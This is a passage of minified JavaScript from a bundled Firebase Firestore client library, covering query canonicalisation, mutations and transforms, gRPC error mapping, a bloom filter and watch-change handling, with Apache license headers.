 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class NV{constructor(e,t=null,r=[],i=[],s=null,o=null,a=null){this.path=e,this.collectionGroup=t,this.orderBy=r,this.filters=i,this.limit=s,this.startAt=o,this.endAt=a,this.le=null}}function jI(n,e=null,t=[],r=[],i=null,s=null,o=null){return new NV(n,e,t,r,i,s,o)}function Av(n){const e=Be(n);if(e.le===null){let t=e.path.canonicalString();e.collectionGroup!==null&&(t+="|cg:"+e.collectionGroup),t+="|f:",t+=e.filters.map(r=>my(r)).join(","),t+="|ob:",t+=e.orderBy.map(r=>function(s){return s.field.canonicalString()+s.dir}(r)).join(","),zp(e.limit)||(t+="|l:",t+=e.limit),e.startAt&&(t+="|lb:",t+=e.startAt.inclusive?"b:":"a:",t+=e.startAt.position.map(r=>Vl(r)).join(",")),e.endAt&&(t+="|ub:",t+=e.endAt.inclusive?"a:":"b:",t+=e.endAt.position.map(r=>Vl(r)).join(",")),e.le=t}return e.le}function bv(n,e){if(n.limit!==e.limit||n.orderBy.length!==e.orderBy.length)return!1;for(let t=0;t<n.orderBy.length;t++)if(!SV(n.orderBy[t],e.orderBy[t]))return!1;if(n.filters.length!==e.filters.length)return!1;for(let t=0;t<n.filters.length;t++)if(!ak(n.filters[t],e.filters[t]))return!1;return n.collectionGroup===e.collectionGroup&&!!n.path.isEqual(e.path)&&!!UI(n.startAt,e.startAt)&&UI(n.endAt,e.endAt)}function yy(n){return Se.isDocumentKey(n.path)&&n.collectionGroup===null&&n.filters.length===0}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class dh{constructor(e,t=null,r=[],i=[],s=null,o="F",a=null,l=null){this.path=e,this.collectionGroup=t,this.explicitOrderBy=r,this.filters=i,this.limit=s,this.limitType=o,this.startAt=a,this.endAt=l,this.he=null,this.Pe=null,this.Te=null,this.startAt,this.endAt}}function PV(n,e,t,r,i,s,o,a){return new dh(n,e,t,r,i,s,o,a)}function xv(n){return new dh(n)}function VI(n){return n.filters.length===0&&n.limit===null&&n.startAt==null&&n.endAt==null&&(n.explicitOrderBy.length===0||n.explicitOrderBy.length===1&&n.explicitOrderBy[0].field.isKeyField())}function uk(n){return n.collectionGroup!==null}function au(n){const e=Be(n);if(e.he===null){e.he=[];const t=new Set;for(const s of e.explicitOrderBy)e.he.push(s),t.add(s.field.canonicalString());const r=e.explicitOrderBy.length>0?e.explicitOrderBy[e.explicitOrderBy.length-1].dir:"asc";(function(o){let a=new yn(Bn.comparator);return o.filters.forEach(l=>{l.getFlattenedFilters().forEach(u=>{u.isInequality()&&(a=a.add(u.field))})}),a})(e).forEach(s=>{t.has(s.canonicalString())||s.isKeyField()||e.he.push(new Ud(s,r))}),t.has(Bn.keyField().canonicalString())||e.he.push(new Ud(Bn.keyField(),r))}return e.he}function bi(n){const e=Be(n);return e.Pe||(e.Pe=LV(e,au(n))),e.Pe}function LV(n,e){if(n.limitType==="F")return jI(n.path,n.collectionGroup,e,n.filters,n.limit,n.startAt,n.endAt);{e=e.map(i=>{const s=i.dir==="desc"?"asc":"desc";return new Ud(i.field,s)});const t=n.endAt?new Bd(n.endAt.position,n.endAt.inclusive):null,r=n.startAt?new Bd(n.startAt.position,n.startAt.inclusive):null;return jI(n.path,n.collectionGroup,e,n.filters,n.limit,t,r)}}function wy(n,e){const t=n.filters.concat([e]);return new dh(n.path,n.collectionGroup,n.explicitOrderBy.slice(),t,n.limit,n.limitType,n.startAt,n.endAt)}function vy(n,e,t){return new dh(n.path,n.collectionGroup,n.explicitOrderBy.slice(),n.filters.slice(),e,t,n.startAt,n.endAt)}function $p(n,e){return bv(bi(n),bi(e))&&n.limitType===e.limitType}function hk(n){return`${Av(bi(n))}|lt:${n.limitType}`}function Va(n){return`Query(target=${function(t){let r=t.path.canonicalString();return t.collectionGroup!==null&&(r+=" collectionGroup="+t.collectionGroup),t.filters.length>0&&(r+=`, filters: [${t.filters.map(i=>lk(i)).join(", ")}]`),zp(t.limit)||(r+=", limit: "+t.limit),t.orderBy.length>0&&(r+=`, orderBy: [${t.orderBy.map(i=>function(o){return`${o.field.canonicalString()} (${o.dir})`}(i)).join(", ")}]`),t.startAt&&(r+=", startAt: ",r+=t.startAt.inclusive?"b:":"a:",r+=t.startAt.position.map(i=>Vl(i)).join(",")),t.endAt&&(r+=", endAt: ",r+=t.endAt.inclusive?"a:":"b:",r+=t.endAt.position.map(i=>Vl(i)).join(",")),`Target(${r})`}(bi(n))}; limitType=${n.limitType})`}function Hp(n,e){return e.isFoundDocument()&&function(r,i){const s=i.key.path;return r.collectionGroup!==null?i.key.hasCollectionId(r.collectionGroup)&&r.path.isPrefixOf(s):Se.isDocumentKey(r.path)?r.path.isEqual(s):r.path.isImmediateParentOf(s)}(n,e)&&function(r,i){for(const s of au(r))if(!s.field.isKeyField()&&i.data.field(s.field)===null)return!1;return!0}(n,e)&&function(r,i){for(const s of r.filters)if(!s.matches(i))return!1;return!0}(n,e)&&function(r,i){return!(r.startAt&&!function(o,a,l){const u=BI(o,a,l);return o.inclusive?u<=0:u<0}(r.startAt,au(r),i)||r.endAt&&!function(o,a,l){const u=BI(o,a,l);return o.inclusive?u>=0:u>0}(r.endAt,au(r),i))}(n,e)}function DV(n){return n.collectionGroup||(n.path.length%2==1?n.path.lastSegment():n.path.get(n.path.length-2))}function fk(n){return(e,t)=>{let r=!1;for(const i of au(n)){const s=OV(i,e,t);if(s!==0)return s;r=r||i.field.isKeyField()}return 0}}function OV(n,e,t){const r=n.field.isKeyField()?Se.comparator(e.key,t.key):function(s,o,a){const l=o.data.field(s),u=a.data.field(s);return l!==null&&u!==null?jl(l,u):Me()}(n.field,e,t);switch(n.dir){case"asc":return r;case"desc":return-1*r;default:return Me()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class va{constructor(e,t){this.mapKeyFn=e,this.equalsFn=t,this.inner={},this.innerSize=0}get(e){const t=this.mapKeyFn(e),r=this.inner[t];if(r!==void 0){for(const[i,s]of r)if(this.equalsFn(i,e))return s}}has(e){return this.get(e)!==void 0}set(e,t){const r=this.mapKeyFn(e),i=this.inner[r];if(i===void 0)return this.inner[r]=[[e,t]],void this.innerSize++;for(let s=0;s<i.length;s++)if(this.equalsFn(i[s][0],e))return void(i[s]=[e,t]);i.push([e,t]),this.innerSize++}delete(e){const t=this.mapKeyFn(e),r=this.inner[t];if(r===void 0)return!1;for(let i=0;i<r.length;i++)if(this.equalsFn(r[i][0],e))return r.length===1?delete this.inner[t]:r.splice(i,1),this.innerSize--,!0;return!1}forEach(e){_o(this.inner,(t,r)=>{for(const[i,s]of r)e(i,s)})}isEmpty(){return G2(this.inner)}size(){return this.innerSize}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const BV=new Qt(Se.comparator);function ds(){return BV}const dk=new Qt(Se.comparator);function Wc(...n){let e=dk;for(const t of n)e=e.insert(t.key,t);return e}function pk(n){let e=dk;return n.forEach((t,r)=>e=e.insert(t,r.overlayedDocument)),e}function Ho(){return lu()}function gk(){return lu()}function lu(){return new va(n=>n.toString(),(n,e)=>n.isEqual(e))}const UV=new Qt(Se.comparator),jV=new yn(Se.comparator);function Ye(...n){let e=jV;for(const t of n)e=e.add(t);return e}const VV=new yn($e);function FV(){return VV}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function kv(n,e){if(n.useProto3Json){if(isNaN(e))return{doubleValue:"NaN"};if(e===1/0)return{doubleValue:"Infinity"};if(e===-1/0)return{doubleValue:"-Infinity"}}return{doubleValue:Ld(e)?"-0":e}}function mk(n){return{integerValue:""+n}}function zV(n,e){return mV(e)?mk(e):kv(n,e)}/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class qp{constructor(){this._=void 0}}function WV(n,e,t){return n instanceof jd?function(i,s){const o={fields:{[Z2]:{stringValue:Y2},[X2]:{timestampValue:{seconds:i.seconds,nanos:i.nanoseconds}}}};return s&&Sv(s)&&(s=Wp(s)),s&&(o.fields[J2]=s),{mapValue:o}}(t,e):n instanceof qu?wk(n,e):n instanceof Ku?vk(n,e):function(i,s){const o=yk(i,s),a=FI(o)+FI(i.Ie);return gy(o)&&gy(i.Ie)?mk(a):kv(i.serializer,a)}(n,e)}function $V(n,e,t){return n instanceof qu?wk(n,e):n instanceof Ku?vk(n,e):t}function yk(n,e){return n instanceof Vd?function(r){return gy(r)||function(s){return!!s&&"doubleValue"in s}(r)}(e)?e:{integerValue:0}:null}class jd extends qp{}class qu extends qp{constructor(e){super(),this.elements=e}}function wk(n,e){const t=_k(e);for(const r of n.elements)t.some(i=>Ci(i,r))||t.push(r);return{arrayValue:{values:t}}}class Ku extends qp{constructor(e){super(),this.elements=e}}function vk(n,e){let t=_k(e);for(const r of n.elements)t=t.filter(i=>!Ci(i,r));return{arrayValue:{values:t}}}class Vd extends qp{constructor(e,t){super(),this.serializer=e,this.Ie=t}}function FI(n){return nn(n.integerValue||n.doubleValue)}function _k(n){return Tv(n)&&n.arrayValue.values?n.arrayValue.values.slice():[]}function HV(n,e){return n.field.isEqual(e.field)&&function(r,i){return r instanceof qu&&i instanceof qu||r instanceof Ku&&i instanceof Ku?Ul(r.elements,i.elements,Ci):r instanceof Vd&&i instanceof Vd?Ci(r.Ie,i.Ie):r instanceof jd&&i instanceof jd}(n.transform,e.transform)}class qV{constructor(e,t){this.version=e,this.transformResults=t}}class ui{constructor(e,t){this.updateTime=e,this.exists=t}static none(){return new ui}static exists(e){return new ui(void 0,e)}static updateTime(e){return new ui(e)}get isNone(){return this.updateTime===void 0&&this.exists===void 0}isEqual(e){return this.exists===e.exists&&(this.updateTime?!!e.updateTime&&this.updateTime.isEqual(e.updateTime):!e.updateTime)}}function Bf(n,e){return n.updateTime!==void 0?e.isFoundDocument()&&e.version.isEqual(n.updateTime):n.exists===void 0||n.exists===e.isFoundDocument()}class Kp{}function Ek(n,e){if(!n.hasLocalMutations||e&&e.fields.length===0)return null;if(e===null)return n.isNoDocument()?new Sk(n.key,ui.none()):new ph(n.key,n.data,ui.none());{const t=n.data,r=gr.empty();let i=new yn(Bn.comparator);for(let s of e.fields)if(!i.has(s)){let o=t.field(s);o===null&&s.length>1&&(s=s.popLast(),o=t.field(s)),o===null?r.delete(s):r.set(s,o),i=i.add(s)}return new Eo(n.key,r,new Cr(i.toArray()),ui.none())}}function KV(n,e,t){n instanceof ph?function(i,s,o){const a=i.value.clone(),l=WI(i.fieldTransforms,s,o.transformResults);a.setAll(l),s.convertToFoundDocument(o.version,a).setHasCommittedMutations()}(n,e,t):n instanceof Eo?function(i,s,o){if(!Bf(i.precondition,s))return void s.convertToUnknownDocument(o.version);const a=WI(i.fieldTransforms,s,o.transformResults),l=s.data;l.setAll(Ik(i)),l.setAll(a),s.convertToFoundDocument(o.version,l).setHasCommittedMutations()}(n,e,t):function(i,s,o){s.convertToNoDocument(o.version).setHasCommittedMutations()}(0,e,t)}function cu(n,e,t,r){return n instanceof ph?function(s,o,a,l){if(!Bf(s.precondition,o))return a;const u=s.value.clone(),h=$I(s.fieldTransforms,l,o);return u.setAll(h),o.convertToFoundDocument(o.version,u).setHasLocalMutations(),null}(n,e,t,r):n instanceof Eo?function(s,o,a,l){if(!Bf(s.precondition,o))return a;const u=$I(s.fieldTransforms,l,o),h=o.data;return h.setAll(Ik(s)),h.setAll(u),o.convertToFoundDocument(o.version,h).setHasLocalMutations(),a===null?null:a.unionWith(s.fieldMask.fields).unionWith(s.fieldTransforms.map(f=>f.field))}(n,e,t,r):function(s,o,a){return Bf(s.precondition,o)?(o.convertToNoDocument(o.version).setHasLocalMutations(),null):a}(n,e,t)}function GV(n,e){let t=null;for(const r of n.fieldTransforms){const i=e.data.field(r.field),s=yk(r.transform,i||null);s!=null&&(t===null&&(t=gr.empty()),t.set(r.field,s))}return t||null}function zI(n,e){return n.type===e.type&&!!n.key.isEqual(e.key)&&!!n.precondition.isEqual(e.precondition)&&!!function(r,i){return r===void 0&&i===void 0||!(!r||!i)&&Ul(r,i,(s,o)=>HV(s,o))}(n.fieldTransforms,e.fieldTransforms)&&(n.type===0?n.value.isEqual(e.value):n.type!==1||n.data.isEqual(e.data)&&n.fieldMask.isEqual(e.fieldMask))}class ph extends Kp{constructor(e,t,r,i=[]){super(),this.key=e,this.value=t,this.precondition=r,this.fieldTransforms=i,this.type=0}getFieldMask(){return null}}class Eo extends Kp{constructor(e,t,r,i,s=[]){super(),this.key=e,this.data=t,this.fieldMask=r,this.precondition=i,this.fieldTransforms=s,this.type=1}getFieldMask(){return this.fieldMask}}function Ik(n){const e=new Map;return n.fieldMask.fields.forEach(t=>{if(!t.isEmpty()){const r=n.data.field(t);e.set(t,r)}}),e}function WI(n,e,t){const r=new Map;st(n.length===t.length);for(let i=0;i<t.length;i++){const s=n[i],o=s.transform,a=e.data.field(s.field);r.set(s.field,$V(o,a,t[i]))}return r}function $I(n,e,t){const r=new Map;for(const i of n){const s=i.transform,o=t.data.field(i.field);r.set(i.field,WV(s,o,e))}return r}class Sk extends Kp{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=2,this.fieldTransforms=[]}getFieldMask(){return null}}class QV extends Kp{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=3,this.fieldTransforms=[]}getFieldMask(){return null}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class YV{constructor(e,t,r,i){this.batchId=e,this.localWriteTime=t,this.baseMutations=r,this.mutations=i}applyToRemoteDocument(e,t){const r=t.mutationResults;for(let i=0;i<this.mutations.length;i++){const s=this.mutations[i];s.key.isEqual(e.key)&&KV(s,e,r[i])}}applyToLocalView(e,t){for(const r of this.baseMutations)r.key.isEqual(e.key)&&(t=cu(r,e,t,this.localWriteTime));for(const r of this.mutations)r.key.isEqual(e.key)&&(t=cu(r,e,t,this.localWriteTime));return t}applyToLocalDocumentSet(e,t){const r=gk();return this.mutations.forEach(i=>{const s=e.get(i.key),o=s.overlayedDocument;let a=this.applyToLocalView(o,s.mutatedFields);a=t.has(i.key)?null:a;const l=Ek(o,a);l!==null&&r.set(i.key,l),o.isValidDocument()||o.convertToNoDocument(De.min())}),r}keys(){return this.mutations.reduce((e,t)=>e.add(t.key),Ye())}isEqual(e){return this.batchId===e.batchId&&Ul(this.mutations,e.mutations,(t,r)=>zI(t,r))&&Ul(this.baseMutations,e.baseMutations,(t,r)=>zI(t,r))}}class Cv{constructor(e,t,r,i){this.batch=e,this.commitVersion=t,this.mutationResults=r,this.docVersions=i}static from(e,t,r){st(e.mutations.length===r.length);let i=function(){return UV}();const s=e.mutations;for(let o=0;o<s.length;o++)i=i.insert(s[o].key,r[o].version);return new Cv(e,t,r,i)}}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ZV{constructor(e,t){this.largestBatchId=e,this.mutation=t}getKey(){return this.mutation.key}isEqual(e){return e!==null&&this.mutation===e.mutation}toString(){return`Overlay{
      largestBatchId: ${this.largestBatchId},
      mutation: ${this.mutation.toString()}
    }`}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class JV{constructor(e,t){this.count=e,this.unchangedNames=t}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var an,Ze;function XV(n){switch(n){case ie.OK:return Me();case ie.CANCELLED:case ie.UNKNOWN:case ie.DEADLINE_EXCEEDED:case ie.RESOURCE_EXHAUSTED:case ie.INTERNAL:case ie.UNAVAILABLE:case ie.UNAUTHENTICATED:return!1;case ie.INVALID_ARGUMENT:case ie.NOT_FOUND:case ie.ALREADY_EXISTS:case ie.PERMISSION_DENIED:case ie.FAILED_PRECONDITION:case ie.ABORTED:case ie.OUT_OF_RANGE:case ie.UNIMPLEMENTED:case ie.DATA_LOSS:return!0;default:return Me()}}function Tk(n){if(n===void 0)return fs("GRPC error has no .code"),ie.UNKNOWN;switch(n){case an.OK:return ie.OK;case an.CANCELLED:return ie.CANCELLED;case an.UNKNOWN:return ie.UNKNOWN;case an.DEADLINE_EXCEEDED:return ie.DEADLINE_EXCEEDED;case an.RESOURCE_EXHAUSTED:return ie.RESOURCE_EXHAUSTED;case an.INTERNAL:return ie.INTERNAL;case an.UNAVAILABLE:return ie.UNAVAILABLE;case an.UNAUTHENTICATED:return ie.UNAUTHENTICATED;case an.INVALID_ARGUMENT:return ie.INVALID_ARGUMENT;case an.NOT_FOUND:return ie.NOT_FOUND;case an.ALREADY_EXISTS:return ie.ALREADY_EXISTS;case an.PERMISSION_DENIED:return ie.PERMISSION_DENIED;case an.FAILED_PRECONDITION:return ie.FAILED_PRECONDITION;case an.ABORTED:return ie.ABORTED;case an.OUT_OF_RANGE:return ie.OUT_OF_RANGE;case an.UNIMPLEMENTED:return ie.UNIMPLEMENTED;case an.DATA_LOSS:return ie.DATA_LOSS;default:return Me()}}(Ze=an||(an={}))[Ze.OK=0]="OK",Ze[Ze.CANCELLED=1]="CANCELLED",Ze[Ze.UNKNOWN=2]="UNKNOWN",Ze[Ze.INVALID_ARGUMENT=3]="INVALID_ARGUMENT",Ze[Ze.DEADLINE_EXCEEDED=4]="DEADLINE_EXCEEDED",Ze[Ze.NOT_FOUND=5]="NOT_FOUND",Ze[Ze.ALREADY_EXISTS=6]="ALREADY_EXISTS",Ze[Ze.PERMISSION_DENIED=7]="PERMISSION_DENIED",Ze[Ze.UNAUTHENTICATED=16]="UNAUTHENTICATED",Ze[Ze.RESOURCE_EXHAUSTED=8]="RESOURCE_EXHAUSTED",Ze[Ze.FAILED_PRECONDITION=9]="FAILED_PRECONDITION",Ze[Ze.ABORTED=10]="ABORTED",Ze[Ze.OUT_OF_RANGE=11]="OUT_OF_RANGE",Ze[Ze.UNIMPLEMENTED=12]="UNIMPLEMENTED",Ze[Ze.INTERNAL=13]="INTERNAL",Ze[Ze.UNAVAILABLE=14]="UNAVAILABLE",Ze[Ze.DATA_LOSS=15]="DATA_LOSS";/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const eF=new io([4294967295,4294967295],0);function HI(n){const e=H2().encode(n),t=new U2;return t.update(e),new Uint8Array(t.digest())}function qI(n){const e=new DataView(n.buffer),t=e.getUint32(0,!0),r=e.getUint32(4,!0),i=e.getUint32(8,!0),s=e.getUint32(12,!0);return[new io([t,r],0),new io([i,s],0)]}class Rv{constructor(e,t,r){if(this.bitmap=e,this.padding=t,this.hashCount=r,t<0||t>=8)throw new $c(`Invalid padding: ${t}`);if(r<0)throw new $c(`Invalid hash count: ${r}`);if(e.length>0&&this.hashCount===0)throw new $c(`Invalid hash count: ${r}`);if(e.length===0&&t!==0)throw new $c(`Invalid padding when bitmap length is 0: ${t}`);this.Ee=8*e.length-t,this.de=io.fromNumber(this.Ee)}Ae(e,t,r){let i=e.add(t.multiply(io.fromNumber(r)));return i.compare(eF)===1&&(i=new io([i.getBits(0),i.getBits(1)],0)),i.modulo(this.de).toNumber()}Re(e){return!!(this.bitmap[Math.floor(e/8)]&1<<e%8)}mightContain(e){if(this.Ee===0)return!1;const t=HI(e),[r,i]=qI(t);for(let s=0;s<this.hashCount;s++){const o=this.Ae(r,i,s);if(!this.Re(o))return!1}return!0}static create(e,t,r){const i=e%8==0?0:8-e%8,s=new Uint8Array(Math.ceil(e/8)),o=new Rv(s,i,t);return r.forEach(a=>o.insert(a)),o}insert(e){if(this.Ee===0)return;const t=HI(e),[r,i]=qI(t);for(let s=0;s<this.hashCount;s++){const o=this.Ae(r,i,s);this.Ve(o)}}Ve(e){const t=Math.floor(e/8),r=e%8;this.bitmap[t]|=1<<r}}class $c extends Error{constructor(){super(...arguments),this.name="BloomFilterError"}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Gp{constructor(e,t,r,i,s){this.snapshotVersion=e,this.targetChanges=t,this.targetMismatches=r,this.documentUpdates=i,this.resolvedLimboDocuments=s}static createSynthesizedRemoteEventForCurrentChange(e,t,r){const i=new Map;return i.set(e,gh.createSynthesizedTargetChangeForCurrentChange(e,t,r)),new Gp(De.min(),i,new Qt($e),ds(),Ye())}}class gh{constructor(e,t,r,i,s){this.resumeToken=e,this.current=t,this.addedDocuments=r,this.modifiedDocuments=i,this.removedDocuments=s}static createSynthesizedTargetChangeForCurrentChange(e,t,r){return new gh(r,t,Ye(),Ye(),Ye())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Uf{constructor(e,t,r,i){this.me=e,this.removedTargetIds=t,this.key=r,this.fe=i}}class Ak{constructor(e,t){this.targetId=e,this.ge=t}}class bk{constructor(e,t,r=Vn.EMPTY_BYTE_STRING,i=null){this.state=e,this.targetIds=t,this.resumeToken=r,this.cause=i}}class KI{constructor(){this.pe=0,this.ye=GI(),this.we=Vn.EMPTY_BYTE_STRING,this.Se=!1,this.be=!0}get current(){return this.Se}get resumeToken(){return this.we}get De(){return this.pe!==0}get ve(){return this.be}Ce(e){e.approximateByteSize()>0&&(this.be=!0,this.we=e)}Fe(){let e=Ye(),t=Ye(),r=Ye();return this.ye.forEach((i,s)=>{switch(s){case 0:e=e.add(i);break;case 2:t=t.add(i);break;case 1:r=r.add(i);break;default:Me()}}),new gh(this.we,this.Se,e,t,r)}Me(){this.be=!1,this.ye=GI()}xe(e,t){this.be=!0,this.ye=this.ye.insert(e,t)}Oe(e){this.be=!0,this.ye=this.ye.remove(e)}Ne(){this.pe+=1}Be(){this.pe-=1,st(this.pe>=0)}Le(){this.be=!0,this.Se=!0}}class tF{constructor(e){this.ke=e,this.qe=new Map,this.Qe=ds(),this.$e=uf(),this.Ue=uf(),this.Ke=new Qt($e)}We(e){for(const t of e.me)e.fe&&e.fe.isFoundDocument()?this.Ge(t,e.fe):this.ze(t,e.key,e.fe);for(const t of e.removedTargetIds)this.ze(t,e.key,e.fe)}je(e){this.forEachTarget(e,t=>{const r=this.He(t);switch(e.state){case 0:this.Je(t)&&r.Ce(e.resumeToken);break;case 1:r.Be(),r.De||r.Me(),r.Ce(e.resumeToken);break;case 2:r.Be(),r.De||this.removeTarget(t);break;case 3:this.Je(t)&&(r.Le(),r.Ce(e.resumeToken));break;case 4:this.Je(t)&&(this.Ye(t),r.Ce(e.resumeToken));break;default:Me()}})}forEachTarget(e,t){e.targetIds.length>0?e.targetIds.forEach(t):this.qe.forEach((r,i)=>{this.Je(i)&&t(i)})}Ze(e){const t=e.targetId,r=e.ge.count,i=this.Xe(t);if(i){const s=i.target;if(yy(s))if(r===0){const o=new Se(s.path);this.ze(t,o,Xn.newNoDocument(o,De.min()))}else st(r===1);else{const o=this.et(t);if(o!==r){const a=this.tt(e),l=a?this.nt(a,e,o):1;if(l!==0){this.Ye(t);const u=l===2?"TargetPurposeExistenceFilterMismatchBloom":"TargetPurposeExistenceFilterMismatch";this.Ke=this.Ke.insert(t,u)}}}}}tt(e){const t=e.ge.unchangedNames;if(!t||!t.bits)return null;const{bits:{bitmap:r="",padding:i=0},hashCount:s=0}=t;let o,a;try{o=uo(r).toUint8Array()}catch(l){if(l instanceof Q2)return Bl("Decoding the base64 bloom filter in existence filter failed ("+l.message+"); ignoring the bloom filter and falling back to full re-query."),null;throw l}try{a=new Rv(o,i,s)}catch(l){return Bl(l instanceof $c?"BloomFilter error: ":"Applying bloom filter failed: ",l),null}return a.Ee===0?null:a}nt(e,t,r){return t.ge.count===r-this.st(e,t.targetId)?0:2}st(e,t){const r=this.ke.getRemoteKeysForTarget(t);let i=0;return r.forEach(s=>{const o=this.ke.it(),a=`projects/${o.projectId}/databases/${o.database}/documents/${s.path.canonicalString()}`;e.mightContain(a)||(this.ze(t,s,null),i++)}),i}ot(e){const t=new Map;this.qe.forEach((s,o)=>{const a=this.Xe(o);if(a){if(s.current&&yy(a.target)){const l=new Se(a.target.path);this._t(l).has(o)||this.ut(o,l)||this.ze(o,l,Xn.newNoDocument(l,e))}s.ve&&(t.set(o,s.Fe()),s.Me())}});let r=Ye();this.Ue.forEach((s,o)=>{let a=!0;o.forEachWhile(l=>{const u=this.Xe(l);return!u||u.purpose==="TargetPurposeLimboResolution"||(a=!1,!1)}),a&&(r=r.add(s))}),this.Qe.forEach((s,o)=>o.setReadTime(e));const i=new Gp(e,t,this.Ke,this.Qe,r);return this.Qe=ds(),this.$e=uf(),this.Ue=uf(),this.Ke=new Qt($e),i}Ge(e,t){if(!this.Je(e))return;const r=this.ut(e,t.key)?2:0;this.He(e).xe(t.key,r),this.Qe=this.Qe.insert(t.key,t),this.$e=this.$e.insert(t.key,this._t(t.key).add(e)),this.Ue=this.Ue.insert(t.key,this.ct(t.key).add(e))}ze(e,t,r){if(!this.Je(e))return;const i=this.He(e);this.ut(e,t)?i.xe(t,1):i.Oe(t),this.Ue=this.Ue.insert(t,this.ct(t).delete(e)),this.Ue=this.Ue.insert(t,this.ct(t).add(e)),r&&(this.Qe=this.Qe.insert(t,r))}removeTarget(e){this.qe.delete(e)}et(e){const t=this.He(e).Fe();return 